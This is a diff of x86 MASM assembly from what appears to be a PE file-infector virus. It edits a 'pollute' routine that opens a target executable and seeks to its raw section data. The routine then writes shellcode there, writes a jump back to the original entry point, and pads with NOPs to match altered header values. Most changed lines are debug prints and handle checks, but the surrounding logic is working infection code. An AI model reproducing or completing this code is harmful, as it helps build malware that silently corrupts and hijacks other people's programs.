@@ -444,11 +444,7 @@ cmp	eax, 0
 je		exitpolluteerror
 
 
-;Currently strangely Failing here
 ;CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
-;invoke 	CreateFile, offset filename, GENERIC_WRITE,  FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
-;invoke	crt_printf, offset patPutStr, offset filename
-;invoke	crt_printf, offset patPutInt, INVALID_HANDLE_VALUE
 
 ;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patDebug
@@ -465,23 +461,22 @@ push	GENERIC_WRITE
 push	filename1
 call		CreateFile
 
-;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; invoke	crt_printf, offset patDebug
-; call		GetLastError
-; invoke	crt_printf, offset patPutInt,  eax
-;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-
-;mov 	filePointer, eax													
-;cmp	eax, INVALID_HANDLE_VALUE
-cmp	eax, -1
+mov 	filePointer, eax													
+cmp	eax, INVALID_HANDLE_VALUE
 je		exitpolluteerror
 
+;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patDebug
+call		GetLastError
+invoke	crt_printf, offset patPutInt,  eax
+;;;;;;;;;;;;;;;;;;; END EBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 pop		eax 													; restore PointerToRawData
 invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN
 ;cmp	eax, INVALID_SET_FILE_POINTER + GetLastError ROFL@MICROSOFT
 ;je		exitpolluteerror
+
+
 
 ; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &sizee, NULL				;writing the shellcode on pointerToRawData
 push	0
@@ -492,6 +487,7 @@ push	offset shellcode
 push	filePointer
 call		WriteFile
 
+
 ;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &size, NULL							;writing jmp operand oldEntryPoint
 push	0
 push	offset sizee
@@ -499,6 +495,7 @@ push	sizeof DWORD
 push	offset decalage
 push	filePointer
 call		WriteFile
+
 
 ;fill the rest with nop in order to have the same size as we put in the header info
 push	ecx
@@ -511,6 +508,8 @@ loop	myloop
 pop		ecx
 
 invoke	CloseHandle, filePointer
+;invoke	crt_printf, offset patDebug
+
 cmp	eax, 0
 je		exitpolluteerror
 
